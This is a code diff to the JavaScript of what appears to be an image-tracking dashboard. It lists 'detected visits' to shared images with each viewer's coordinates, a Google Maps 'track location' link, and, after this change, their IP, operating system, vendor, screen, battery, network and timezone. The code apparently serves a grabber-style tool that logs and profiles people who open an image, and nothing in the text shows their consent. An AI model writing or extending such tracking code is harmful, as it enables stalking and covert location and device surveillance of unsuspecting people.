@@ -205,6 +205,19 @@
                     trackingHtml += `<div style="margin-top: 15px; font-weight: bold; color: #ffeb3b; font-size: 0.9rem;">👁️ VISITAS DETECTADAS (${img.views.length})</div>`;
                     img.views.forEach((v, index) => {
                         if (v.latitude && v.longitude) {
+                            // Format simple hardware info
+                            const d = v.details || {};
+                            const techInfo = [
+                                v.ip ? `🌐 IP: ${v.ip}` : '',
+                                d.platform ? `💻 ${d.platform}` : '',
+                                d.vendor ? `🏢 ${d.vendor}` : '',
+                                d.touch ? `👆 ${d.touch}` : '',
+                                d.screen ? `🖥️ ${d.screen}` : '',
+                                d.battery ? `🔋 ${d.battery}` : '',
+                                d.network ? `📶 ${d.network}` : '',
+                                d.timezone ? `🕒 ${d.timezone}` : ''
+                            ].filter(Boolean).join(' | ');
+
                             trackingHtml += `
                             <div style="background: rgba(255, 235, 59, 0.1); border-left: 4px solid #ffeb3b; padding: 10px; margin-top: 5px; border-radius: 4px;">
                                 <div style="display:flex; justify-content:space-between;">
@@ -212,12 +225,24 @@
                                     <span style="font-size:0.75rem; color:#ccc;">${new Date(v.timestamp).toLocaleString()}</span>
                                 </div>
                                 <div style="font-size: 0.8rem; color: #ddd; margin-top:2px;">Lat: ${v.latitude.toFixed(5)}, Lng: ${v.longitude.toFixed(5)}</div>
-                                <a href="https://www.google.com/maps?q=${v.latitude},${v.longitude}" target="_blank" style="color: #fff; font-size: 0.8rem; text-decoration: underline;">Rastrear Ubicación</a>
+                                
+                                <div style="font-size: 0.75rem; color: #aaa; margin-top:5px; border-top: 1px solid rgba(255,255,255,0.1); padding-top:4px; line-height: 1.4;">
+                                    ${techInfo}
+                                </div>
+                                
+                                <a href="https://www.google.com/maps?q=${v.latitude},${v.longitude}" target="_blank" style="color: #fff; font-size: 0.8rem; text-decoration: underline; display:block; margin-top:5px;">Rastrear Ubicación</a>
                             </div>`;
                         } else {
+                            const d = v.details || {};
+                            const techInfo = [
+                                v.ip ? `🌐 IP: ${v.ip}` : '',
+                                d.platform ? `💻 OS: ${d.platform}` : ''
+                            ].filter(Boolean).join(' | ');
+
                             trackingHtml += `
                             <div style="padding: 5px; margin-top: 5px; font-size:0.8rem; color:#aaa;">
-                                ⚠️ Visita registrada sin ubicación (Permiso denegado) - ${new Date(v.timestamp).toLocaleString()}
+                                ⚠️ Visita registrada sin ubicación - ${new Date(v.timestamp).toLocaleString()}<br>
+                                <span style="font-size:0.7rem; color:#666;">${techInfo}</span>
                             </div>`;
                         }
                     });
